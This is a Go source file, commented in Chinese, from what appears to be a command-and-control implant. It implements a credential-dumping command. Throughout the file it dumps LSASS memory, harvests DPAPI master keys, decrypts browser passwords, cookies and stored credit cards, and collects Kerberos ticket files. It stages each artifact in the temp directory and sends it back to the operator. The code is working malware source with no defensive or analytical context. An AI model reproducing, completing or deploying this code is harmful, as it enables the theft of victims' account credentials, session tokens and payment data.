package services

import (
	"errors"
	"fmt"
	"implant/core/debuglog"
	"os"
	"path/filepath"
	"strings"
)

// 凭据获取（阶段三起）：cmdBuf = "kind|tech|fileName"
//
// 三类制品走同一条管线（回传复用下载通道：type22 头 + type26 分块）：
//
//	lsass    内存转储（二进制大制品，必须回传原件由操作员本地解析）
//	dpapi    用户主密钥集（ZIP：manifest.json + keys/<GUID>.json，已是明文 masterkey）
//	browser  浏览器口令与 Cookie（JSON：**在植入体内存里解密成明文**后回传）
//
// 后两类的明文/密钥都很小，因此"解析在内存完成、只有制品短暂落 %TEMP%、回传后删除"
// 是可行且必要的：把原始 SQLite 库或 masterkey 目录直接打包回传虽然省事，
// 但服务端会积攒大量明文材料，违背"不落盘明文口令"的约定。
//
// 技术（tech）按类型分域，与服务端 cred.TechsFor 一一对应：
//
//	lsass   : auto | comsvcs | dbgcore
//	dpapi   : keys
//	browser : all | chrome | edge | firefox | cards（cards = Web Data：信用卡 + 自动填充）
//	ticket  : files（MIT ccache 文件；Windows 原生 LSA 票据不在此列）
func CmdCredDump(cmdBuf []byte) ([]byte, error) {
	parts := strings.SplitN(string(cmdBuf), "|", 3)
	if len(parts) != 3 {
		return nil, errors.New("凭据命令格式错误（期望 kind|tech|fileName）")
	}
	kind := strings.ToLower(strings.TrimSpace(parts[0]))
	tech := strings.ToLower(strings.TrimSpace(parts[1]))
	fileName := strings.TrimSpace(parts[2])
	if kind == "" || fileName == "" {
		return nil, errors.New("凭据命令缺少类型或文件名")
	}
	// 文件名来自服务端，但仍做一次净化：它会被拼进目标路径
	if strings.ContainsAny(fileName, `/\`) || strings.Contains(fileName, "..") {
		return nil, errors.New("非法的制品文件名")
	}
	if tech == "" {
		tech = defaultCredTech(kind)
	}
	if !credTechAllowed(kind, tech) {
		return nil, fmt.Errorf("类型 %s 不支持的技术: %s", kind, tech)
	}

	switch kind {
	case "lsass":
		return credDumpLSASS(tech, fileName)
	case "dpapi":
		return credDumpDPAPI(tech, fileName)
	case "browser":
		return credDumpBrowser(tech, fileName)
	case "ticket":
		return credDumpTickets(tech, fileName)
	default:
		return nil, errors.New("暂不支持的凭据类型: " + kind)
	}
}

// defaultCredTech 与服务端 cred.DefaultTech 保持一致
func defaultCredTech(kind string) string {
	switch kind {
	case "dpapi":
		return "keys"
	case "browser":
		return "all"
	case "ticket":
		return "files"
	default:
		return "auto"
	}
}

// credTechAllowed 技术是否属于该类型（跨类型误配当场拒绝，不下发无意义的任务）
func credTechAllowed(kind, tech string) bool {
	switch kind {
	case "lsass":
		return tech == "auto" || tech == "comsvcs" || tech == "dbgcore"
	case "dpapi":
		return tech == "keys"
	case "browser":
		// cards = Chromium 的 Web Data（信用卡 + 自动填充），单独开关
		return tech == "all" || tech == "chrome" || tech == "edge" || tech == "firefox" || tech == "cards"
	case "ticket":
		return tech == "files"
	default:
		return false
	}
}

// credTempPath 制品落盘路径：临时目录 + 服务端指定的文件名
func credTempPath(fileName string) string {
	return filepath.Join(os.TempDir(), fileName)
}

// credDumpLSASS 内存转储：同步生成、异步回传（转储可达数百 MB，不能阻塞命令链）
func credDumpLSASS(tech, fileName string) ([]byte, error) {
	destPath, err := dumpCredential("lsass", tech, fileName)
	if err != nil {
		debuglog.Printf("❌ [CRED] lsass 获取失败: %v\n", err)
		return nil, err
	}
	debuglog.Printf("✅ [CRED] lsass 转储已生成: %s，开始回传\n", destPath)
	go exfilFile(destPath, true)
	return []byte(fmt.Sprintf("[+] LSASS 内存转储已生成并开始回传: %s", fileName)), nil
}

// credDumpDPAPI 主密钥集：加密封包小（几 KB），同步完成后再异步回传
func credDumpDPAPI(_tech, fileName string) ([]byte, error) {
	destPath := credTempPath(fileName)
	_ = os.Remove(destPath)
	path, n, err := collectDPAPIMasterKeys(destPath)
	if err != nil {
		debuglog.Printf("❌ [CRED] DPAPI 主密钥采集失败: %v\n", err)
		return nil, err
	}
	debuglog.Printf("✅ [CRED] DPAPI 主密钥已打包: %s（%d 把），开始回传\n", path, n)
	go exfilFile(path, true)
	return []byte(fmt.Sprintf("[+] DPAPI 主密钥集已生成并开始回传: %s（%d 把主密钥）", fileName, n)), nil
}

// credDumpBrowser 浏览器凭据：内存解密 → 写 JSON → 异步回传
func credDumpBrowser(tech, fileName string) ([]byte, error) {
	art, err := collectBrowserCredentials(tech)
	if err != nil {
		debuglog.Printf("❌ [CRED] 浏览器凭据采集失败: %v\n", err)
		return nil, err
	}
	raw, err := art.MarshalArtifact()
	if err != nil {
		return nil, fmt.Errorf("序列化浏览器凭据失败: %w", err)
	}
	destPath := credTempPath(fileName)
	if err := os.WriteFile(destPath, raw, 0o600); err != nil {
		return nil, fmt.Errorf("写出浏览器凭据制品失败: %w", err)
	}

	creds, cookies := 0, 0
	for _, b := range art.Browsers {
		creds += len(b.Credentials)
		cookies += len(b.Cookies)
	}
	debuglog.Printf("✅ [CRED] 浏览器凭据制品已生成: %s（%d 条口令 / %d 条 Cookie），开始回传\n",
		destPath, creds, cookies)
	go exfilFile(destPath, true)

	msg := fmt.Sprintf("[+] 浏览器凭据已生成并开始回传: %s（%d 条口令 / %d 条 Cookie",
		fileName, creds, cookies)
	if len(art.Errors) > 0 {
		msg += fmt.Sprintf("；%d 项采集错误", len(art.Errors))
	}
	return []byte(msg + "）"), nil
}
